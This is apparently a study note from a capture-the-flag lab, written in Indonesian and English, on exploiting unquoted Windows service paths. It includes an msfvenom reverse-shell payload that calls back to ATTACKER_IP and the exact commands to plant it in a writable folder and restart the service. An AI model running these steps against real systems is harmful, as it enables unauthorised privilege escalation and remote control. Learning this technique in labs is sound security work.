@@ -1,0 +1,66 @@
+# Unquoted Service Paths
+Meski kita tidak bisa write langsung ke service exec, kita mungkin masih punya kesempatan untuk force a service run arbitrary executable dengan menggunakan obscure feature. Perilaku yang biasa terjadi di windows service adalah ketika service configured untuk menunjuk ke "unquoted" exec, yang mana berarti path dari associated exec tidak dikutip secara benar sampai spasi pada command. Contohnya disini terdapat 2 perbandingan dari service di THM target machhine.
+
+Contoh 1: proper quotation `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"` sehingga SCM tau bahwa akan execute binary di dir tersebut. Kita dapat cek
+```
+sc qc "vncserver"
+...
+SERVICE_NAME: vncserver
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : VNC Server
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+Contoh 2: unquoted service path `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`, dapat di cek dengan
+```
+sc qc "disk sorter enterprise"
+...
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr2
+```
+ketika SCM mencoba execute binary unquoted path tersebut, akan terjadi masalah karena terdapat spasi di folder `Disk Sorter Enterprise`, command menjadi ambigu, dan SCM tidak tahu mana yang mau di execute, apakah `C:\MyPrograms\Disk.exe` dengan arg1 `Sorter` arg2 `Enterprise\bin\disksrs.exe`, apakah `C:\MyPrograms\Disk Sorter.exe` dengan arg1 `Enterprise\bin\disksrs.exe`, atau `C:\MyProgram\Disk Sorter Enterprise\bin\disksrs.exe`. Hal ini terjadi karena command line menganggap sesuatu setelah spasi adalah argument, sehingga binary path yang terbaca sebagai exec adalah `C:\\MyPrograms\\Disk.exe`. Dan daripada memberikan error, SCM mencari tahu sendiri artinya apakah 1 command dengan 2 argumen, 1 command dengan 1 argumen atau 1 command saja.
+
+Dari hal tersebut, kita sebagai attacker dapat memanfaatkannya untuk run exec. Hampir semua servce exec akan terinstall di `C:\Program Files` atau `C:\Program Files (x86)` secara default, dan tidak writeable oleh unpriv user. Tapi ada pengecualian, sebagian installer mengganti permission pada installed folder, adminsitrator mungkin install di non-default path. Pada kasus ini, administrator install Disk Sorter binary di `C:\MyPrograms` yg mana writeable oleh semua user
+```
+icacls c:\MyPrograms
+...
+c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+              BUILTIN\Administrators:(I)(OI)(CI)(F)
+              BUILTIN\Users:(I)(OI)(CI)(RX)
+              BUILTIN\Users:(I)(CI)(AD)
+              BUILTIN\Users:(I)(CI)(WD)
+              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+```
+(AD) dan (WD) pada builtin user berarti mengijinkan user untuk dapat membuat subdir dan file. Untuk itu kita dapat exploitasinya dengan pertama
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
+```
+buat payloadnya dengan msfvenom. Selanjutnya kirim payload ke target dengan python server, dan jangan lupa siapkan listener sesuai dengan port yang ada di payload. Lalu lakukan beberapa langkah
+```
+# pindahkan payload ke unquoted service
+C:\> move C:\tools\rev-svc2.exe C:\MyPrograms\Disk.exe
+
+# grant permission untuk Everyone group
+C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+        Successfully processed 1 files.
+
+# stop service
+C:\> sc stop "disk sorter enterprise"
+
+# start service kembali
+C:\> sc start "disk sorter enterprise"
+```
+dan kita akan mendapat revshell
